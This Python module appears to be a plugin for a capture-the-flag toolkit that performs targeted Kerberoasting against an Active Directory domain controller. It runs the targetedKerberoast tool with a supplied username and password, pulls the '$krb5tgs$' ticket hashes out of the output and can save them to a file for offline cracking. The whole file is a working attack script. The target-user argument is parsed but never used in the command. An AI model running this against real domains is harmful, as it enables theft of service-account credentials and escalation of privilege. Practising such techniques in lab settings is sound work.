import subprocess
from pathlib import Path


def run(data, cred, args):
    """
    Perform targeted Kerberoasting using GenericWrite

    Usage:
        ctf ad.targetedkerberoast ethan
        ctf ad.targetedkerberoast ethan -o hash.txt
    """

    # -------------------------
    # Parse arguments
    # -------------------------
    extra = getattr(args, "extra", []) or []

    if len(extra) < 1:
        print("[-] Missing target user")
        return data

    target_user = extra[0]
    out_file = getattr(args, "out", None)

    # -------------------------
    # Resolve target info
    # -------------------------
    ip = data.get("ip")
    domain = data.get("domain")

    if not ip:
        print("[-] Target missing IP")
        return data

    if not domain:
        print("[-] No domain set")
        return data

    # -------------------------
    # Validate credential
    # -------------------------
    if not cred:
        print("[-] No active credential")
        return data

    username = cred.get("user")
    password = cred.get("secret") if cred.get("type") == "password" else None

    if not username or not password:
        print("[-] Need password-based credential")
        return data

    # -------------------------
    # Build command
    # -------------------------
    cmd = [
    "targetedKerberoast",
    "-d", domain,
    "-u", username,
    "-p", password,
    "--dc-ip", ip
]

    print(f"[*] Running: {' '.join(cmd)}")

    # -------------------------
    # Execute
    # -------------------------
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True
        )
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return data

    output = result.stdout + result.stderr
    print(output)

    # -------------------------
    # Extract hash
    # -------------------------
    hashes = []

    for line in output.splitlines():
        if "$krb5tgs$" in line:
            hashes.append(line.strip())

    if not hashes:
        print("[-] No Kerberoast hash found")
        return data

    print("\n[+] Extracted hashes:\n")

    for h in hashes:
        print(h)

    # -------------------------
    # Optional save
    # -------------------------
    if out_file:
        out_path = Path(out_file).expanduser()
        out_path.write_text("\n".join(hashes) + "\n")
        print(f"\n[+] Saved to: {out_path}")

    return data